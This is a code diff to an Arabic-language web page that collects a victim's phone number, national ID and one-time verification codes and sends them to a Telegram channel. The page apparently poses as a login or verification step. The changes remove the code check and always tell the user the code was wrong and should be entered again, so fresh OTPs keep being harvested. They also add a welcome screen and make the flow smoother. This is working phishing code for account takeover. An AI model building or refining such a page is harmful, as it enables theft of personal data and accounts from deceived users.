+            const codeDigits = Array.from(document.querySelectorAll('.code-digit'));
+            formData.verificationCode = codeDigits.map(input => input.value).join('');
 
             if (formData.verificationCode.length !== 4) {
-                showToast('يرجى إدخال رمز التحقق كاملاً', 'error');
                 return;
             }
 
-            // In real scenario, you would verify the code
-            // For demo, any code works - you can change this
-            console.log('الكود المدخل:', formData.verificationCode);
-            console.log('الكود الصحيح:', formData.generatedCode);
-
-            const verifyBtn = document.getElementById('verifyBtn');
-            verifyBtn.disabled = true;
-            verifyBtn.innerHTML = '<span class="loading"></span>';
-
-            // Send verification data to Telegram
             const sent = await sendToTelegram(formData);
 
-            verifyBtn.disabled = false;
-            verifyBtn.textContent = 'تأكيد';
-
             if (sent) {
-                // Here you would typically verify the code with backend
-                // For now, we'll show success
-                showToast('تم إرسال رمز التحقق بنجاح، يرجى انتظار التأكيد', 'info');
-                
-                // Clear inputs for next attempt if needed
+                showModal('يرجى الإدخال مرة أخرى', 'تم الإرسال، يرجى إدخال الرمز مرة أخرى بشكل صحيح');
                 clearCodeInputs();
             } else {
-                showToast('خطأ في الإرسال، يرجى المحاولة مرة أخرى', 'error');
+                showToast('خطأ', 'error');
             }
         };
 
@@ -710,62 +1091,78 @@ ${data.verificationCode ? `✓ رمز التحقق: ${data.verificationCode}` : 
         const resendCode = async () => {
             const resendBtn = document.getElementById('resendBtn');
             resendBtn.disabled = true;
-            resendBtn.textContent = 'جاري الإرسال...';
 
             formData.generatedCode = generateVerificationCode();
-            console.log('كود التحقق الجديد:', formData.generatedCode);
 
             const sent = await sendToTelegram(formData);
 
             if (sent) {
-                showToast('تم إرسال رمز تحقق جديد، يرجى إدخاله بالشكل الصحيح', 'success');
+                showToast('Code Resent', 'success');
                 clearCodeInputs();
                 timeRemaining = VERIFICATION_TIMER;
+                clearInterval(timerInterval);
                 startTimer();
-                resendBtn.textContent = 'إعادة إرسال الرمز';
+                
+                resendCountdown = 60;
+                updateResendCountdown();
+                resendInterval = setInterval(updateResendCountdown, 1000);
             } else {
-                showToast('خطأ في إعادة الإرسال، يرجى المحاولة مرة أخرى', 'error');
+                showToast('خطأ', 'error');
                 resendBtn.disabled = false;
-                resendBtn.textContent = 'إعادة إرسال الرمز';
             }
         };
 
+        const updateResendCountdown = () => {
+            resendCountdown--;
+            const resendBtn = document.getElementById('resendBtn');
+            const resendCountdownEl = document.getElementById('resendCountdown');
+            
+            if (resendCountdown > 0) {
+                resendCountdownEl.textContent = `Wait ${resendCountdown}s`;
+                resendBtn.disabled = true;
+            } else {
+                clearInterval(resendInterval);
+                resendCountdownEl.textContent = '';
+                resendBtn.disabled = false;
+            }
+        };
+
+        // صفحة الترحيب
+        const goToLogin = () => {
+            document.getElementById('welcomeSection').classList.remove('active');
+            document.getElementById('header').classList.add('active');
+            document.getElementById('content').classList.add('active');
+        };
+
         // Event Listeners
+        document.getElementById('startBtn').addEventListener('click', goToLogin);
         document.getElementById('loginBtn').addEventListener('click', switchToVerification);
-        document.getElementById('verifyBtn').addEventListener('click', verifyCode);
         document.getElementById('resendBtn').addEventListener('click', resendCode);
+        document.getElementById('modalBtn').addEventListener('click', closeModal);
 
-        // Phone input formatting
         document.getElementById('phone').addEventListener('input', (e) => {
-            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 10);
+            let value = e.target.value;
+            value = convertArabicToEnglish(value);
+            value = value.replace(/\D/g, '').slice(0, 10);
+            e.target.value = value;
         });
 
-        // National ID - allow only numbers
-        document.getElementById('nationalId').addEventListener('input', (e) => {
-            e.target.value = e.target.value.replace(/\D/g, '');
-        });
-
-        // Code input handling
         document.querySelectorAll('.code-digit').forEach((input, index) => {
             input.addEventListener('input', (e) => {
-                const value = e.target.value.replace(/\D/g, '');
+                let value = e.target.value;
+                value = convertArabicToEnglish(value);
+                value = value.replace(/\D/g, '');
                 e.target.value = value;
 
                 if (value) {
                     e.target.classList.add('filled');
                     if (index < 3) {
                         document.querySelector(`.code-digit[data-index="${index + 1}"]`).focus();
+                    } else {
+                        setTimeout(verifyCode, 300);
                     }
                 } else {
                     e.target.classList.remove('filled');
-                }
-
-                // Auto-verify if all digits are entered
-                const allFilled = Array.from(document.querySelectorAll('.code-digit'))
-                    .every(input => input.value);
-                
-                if (allFilled && timeRemaining > 0) {
-                    setTimeout(verifyCode, 300);
                 }
             });
 
@@ -777,7 +1174,8 @@ ${data.verificationCode ? `✓ رمز التحقق: ${data.verificationCode}` : 
 
             input.addEventListener('paste', (e) => {
                 e.preventDefault();
-                const paste = (e.clipboardData || window.clipboardData).getData('text');
+                let paste = (e.clipboardData || window.clipboardData).getData('text');
+                paste = convertArabicToEnglish(paste);
                 const digits = paste.replace(/\D/g, '').slice(0, 4);
                 
                 digits.split('').forEach((digit, i) => {
@@ -787,10 +1185,16 @@ ${data.verificationCode ? `✓ رمز التحقق: ${data.verificationCode}` : 
                     }
                 });
 
-                if (digits.length === 4) {
+                if (digits.length === 4 && timeRemaining > 0) {
                     setTimeout(verifyCode, 300);
                 }
             });
+        });
+
+        document.addEventListener('touchmove', (e) => {
+            if (e.target.closest('.mobile-container')) {
+                if (e.touches.length > 1) e.preventDefault();
+            }
         });
     </script>
 </body>
